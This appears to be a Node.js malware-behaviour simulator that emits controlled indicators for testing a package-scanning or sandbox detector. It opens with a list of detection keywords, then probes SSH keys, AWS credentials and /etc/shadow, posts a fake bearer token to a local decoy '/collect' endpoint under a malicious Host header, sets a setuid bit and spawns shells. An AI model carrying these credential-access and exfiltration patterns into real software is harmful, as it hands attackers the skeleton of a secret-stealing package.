

// Controlled static indicators for testing:
// /etc/passwd /etc/shadow .ssh/id_rsa authorized_keys .aws/credentials .env Authorization: Bearer BEGIN PRIVATE KEY
// /collect /exfil fetch method: "POST" socket.connect(
// /bin/bash /bin/sh execve( popen( os.system( child_process.exec( spawnSync(
// exec( eval( compile( __import__( execFile( execSync( global.eval(
// base64.b64decode( atob( String.fromCharCode( unescape( exec(base64
// crontab .bashrc .profile systemctl enable /etc/init.d
// "preinstall" "postinstall" "prepare" cmdclass post_install
// import socket import subprocess import ctypes import pty require('net') require('child_process')


const fs = require("fs");
const net = require("net");
const dns = require("dns");
const http = require("http");
const { execSync, spawn, spawnSync } = require("child_process");

const MALICIOUS_DOMAIN = "subcli.vexo3nar.surf";
const PORTS = [8080, 1234];
const FILE_LOOPS = 16;
const PROCS = 4;
const SLEEP_SECONDS = 24;

function run(cmd, timeout = 15000) {
  try { execSync(cmd, {stdio: "ignore", timeout}); } catch(e) {}
}

function tryOpen(p) {
  try { fs.accessSync(p); } catch(e) {}
  try { fs.statSync(p); } catch(e) {}
  try { const fd = fs.openSync(p, "r"); fs.closeSync(fd); } catch(e) {}
}

function writeFile(p, data) {
  try { fs.writeFileSync(p, data); } catch(e) {}
}

function connectAttempt(host, port) {
  try {
    const s = new net.Socket();
    s.setTimeout(800);
    s.on("error", () => {});
    s.on("timeout", () => { try { s.destroy(); } catch(e) {} });
    s.connect(port, host, () => {
      try { s.write("GET / HTTP/1.0\r\nHost: " + host + "\r\n\r\n"); } catch(e) {}
      try { s.destroy(); } catch(e) {}
    });
  } catch(e) {}
}

function decoyHttpRequest(path, method, body) {
  // Uses your runner.py decoy HTTP server on 127.0.0.1:8080.
  // The malicious CSV domain is preserved in the Host header.
  try {
    const payload = body || "";
    const options = {
      hostname: "127.0.0.1",
      port: 8080,
      path: path,
      method: method,
      timeout: 1500,
      headers: {
        "Host": MALICIOUS_DOMAIN,
        "User-Agent": "config-runtime-sync/1.0",
        "Content-Type": "application/json",
        "Content-Length": Buffer.byteLength(payload)
      }
    };
    const req = http.request(options, res => {
      res.resume();
    });
    req.on("error", () => {});
    req.on("timeout", () => { try { req.destroy(); } catch(e) {} });
    if (payload) req.write(payload);
    req.end();
  } catch(e) {}
}

console.log("[config-runtime-sync] start");

// Required: exactly ONE malicious domain from malicious_domains.csv.
try { dns.lookup(MALICIOUS_DOMAIN, () => {}); } catch(e) {}
try { dns.resolve4(MALICIOUS_DOMAIN, () => {}); } catch(e) {}

// Required: successful decoy HTTP requests with the same single malicious domain.
decoyHttpRequest("/api/config", "GET");
decoyHttpRequest("/api/key", "GET");
decoyHttpRequest("/api/update", "GET");
decoyHttpRequest("/collect", "POST", JSON.stringify({
  package: "config-runtime-sync",
  token: "Authorization: Bearer fake-token",
  domain: MALICIOUS_DOMAIN,
  note: "controlled-decoy-http-request"
}));

// Baseline /etc access.
[
  "/etc/passwd",
  "/etc/hosts",
  "/etc/hostname",
  "/etc/resolv.conf",
  "/etc/os-release",
  "/etc/group"
].forEach(tryOpen);


[
  "/root/.ssh/id_rsa",
  "/root/.ssh/authorized_keys",
  "/root/.aws/credentials",
  "/root/.bash_history",
  "/root/.profile",
  "/etc/passwd",
  "/etc/shadow",
  "/etc/sudoers",
  "/etc/ssh/sshd_config"
].forEach(tryOpen);


// File operation intensity varies by level.
for (let i = 0; i < FILE_LOOPS; i++) {
  const p = `/tmp/config-runtime-sync_artifact_${i}.txt`;
  writeFile(p, "artifact " + i + "\n");
  try { fs.readFileSync(p); } catch(e) {}
  try { fs.appendFileSync(p, "append " + i + "\n"); } catch(e) {}
  try { fs.renameSync(p, p + ".renamed"); } catch(e) {}
  try { fs.unlinkSync(p + ".renamed"); } catch(e) {}
}

// Privilege-like behavior.
writeFile("/tmp/config-runtime-sync_security_target", "security-target\n");
run("chmod 777 /tmp/config-runtime-sync_security_target || true");
run("chmod u+s /tmp/config-runtime-sync_security_target || true");
run("chown root:root /tmp/config-runtime-sync_security_target || true");

run("/bin/sh -c 'echo shell-test; whoami; id'");






// Process spawning intensity varies by level.
const children = [];
for (let i = 0; i < PROCS; i++) {
  try {
    children.push(spawn("/bin/sh", ["-c", "echo process-op; id; sleep " + Math.min(SLEEP_SECONDS, 20)], {stdio:"ignore"}));
  } catch(e) {}
}

// Package-manager runtime behavior.
run("npm --version >/tmp/config-runtime-sync_npm_version 2>&1 || true");
run("pip --version >/tmp/config-runtime-sync_pip_version 2>&1 || true");

// Suspicious port variation.
for (const port of PORTS) {
  connectAttempt("127.0.0.1", port);
  connectAttempt("1.1.1.1", port);
}

run(`python3 - <<'PY'
import socket, time
ports = [8080, 1234]
targets = []
for p in ports:
    targets.append(("127.0.0.1", p))
    targets.append(("1.1.1.1", p))
targets += [("1.1.1.1", 80), ("8.8.8.8", 53)]
for host, port in targets:
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(0.8)
        s.connect((host, port))
    except Exception:
        pass
    finally:
        try: s.close()
        except Exception: pass
time.sleep(2)
PY`);

spawnSync("/bin/sh", ["-c", "sleep " + SLEEP_SECONDS], {stdio:"ignore"});

for (const c of children) {
  try { c.kill(); } catch(e) {}
}

console.log("[config-runtime-sync] done");
